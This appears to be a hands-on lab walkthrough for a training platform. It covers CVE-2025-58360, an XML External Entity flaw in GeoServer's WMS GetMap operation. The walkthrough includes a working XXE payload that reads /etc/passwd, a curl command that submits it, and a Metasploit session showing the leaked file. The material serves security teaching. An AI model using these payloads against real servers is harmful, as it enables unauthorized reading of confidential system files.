# GeoServer: CVE-2025-58360

Now that you've explored GeoServer and its capabilities, let's dive into what makes this vulnerability possible. XML External Entity vulnerabilities arise when a weakly configured XML parser processes input containing a reference to an external entity. If the parser is not restricted, an attacker can potentially access confidential system files or interact with internal network services. Imagine you're filling out a form that accepts XML as input. Instead of only submitting normal data, you include instructions that tell the parser to get data from somewhere else, say a file you want to read.

### How the Attack Works

As we learned in the previous task, GeoServer supports several XML-based request types, including the `GetMap` operation. `GetMap` is often used with HTTP `GET` requests, but GeoServer also allows it to be submitted as XML via a `POST` request.&#x20;

When an attacker targets the `GetMap` operation, the vulnerability unfolds in the following steps:

1. **Request:** The attacker sends an HTTP `POST` request to the GeoServer `wms` path containing an XML body
2. **Parsing:** The server receives the request and utilizes its internal XML parser to read the instructions
3. **Weakness:** Because the parser is not restricted, it processes a `DOCTYPE` declaration that defines an external entity
4. **Resolution:** The parser resolves the entity by fetching the resource defined by the attacker (`/etc/passwd`)
5. **Processing:** GeoServer processes the map request, unknowingly incorporating the resolved entity content
6. **Exfiltration:** The server includes the contents of the sensitive file in the error message returned to the attacker

<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

**Affected Versions**

The target machine in this room is running GeoServer version 2.26.1, which is vulnerable to the XML External Entity (XXE) issue in the `GetMap` operation. This vulnerability affects versions prior to 2.25.6 as well as 2.26.0 and 2.26.1.

### The Exploit

To exploit this vulnerability, you will first craft a malicious XML document, then submit it to GeoServer using a `curl` request that references the XML file.

In the example below, the XML document instructs the server to read the `/etc/passwd` file. Rather than requesting valid map data, the XML forces the parser to load the file's contents. Go ahead and use your favorite text editor to craft the XML document and name it `exploit.xml`.

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd"> <!-- Change Your File Location According To You -->
]>
<StyledLayerDescriptor version="1.0.0">
<NamedLayer>
<Name>&xxe;</Name>
</NamedLayer>
</StyledLayerDescriptor>
```

**Submitting Your Request**

Now that you have crafted your XML document, it is time to submit the request to the server. Use the command below, let's attempt to read the `/etc/passwd` file.

`curl -X POST "http://geoserver.thm:8080/geoserver/wms?REQUEST=GetMap&SERVICE=WMS" -H "Content-Type: application/xml" -d @exploit.xml`

* `curl -X POST` sends a `POST` request to the target server
* `http://10.48.166.4:8080/geoserver/wms?REQUEST=GetMap&SERVICE=WMS` your target server, port, and GeoServer path
* `-H "Content-Type: application/xml"` specifying an XML document
* `-d @exploit.xml` referencing the previously created XML document

**Reading the File**

After submitting the request, you will see the following output. The result of the file we want to read, `/etc/passwd`, can be seen following the `Unknown layer:` text.

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Using Metasploit

A recent Metasploit [module](https://www.rapid7.com/db/modules/auxiliary/gather/geoserver_wms_getmap_xxe_file_read/) has been developed that makes this exploit even easier. Let's test it against the target machine by launching `msfconsole`, configuring the necessary options, and running the exploit using the following commands. By default, the module reads the `/etc/passwd` file on the host server.

### msfconsole xxe

```shell-session
user@tryhackme$ msfconsole -q

msf6 > use auxiliary/gather/geoserver_wms_getmap_xxe_file_read
msf6 > set RHOSTS 10.48.166.4
msf6 > set RPORT 8080
msf6 > exploit

[*] Running module against 10.48.166.4
[*] Attempting to read file: /etc/passwd
[*] Sending XXE payload to /geoserver/wms?bbox=129.19,68.56,168.73,87.15&format=image/jpeg&height=236&width=172&version=1.1.1&request=GetMap&service=WMS
[+] Successfully read file: /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```
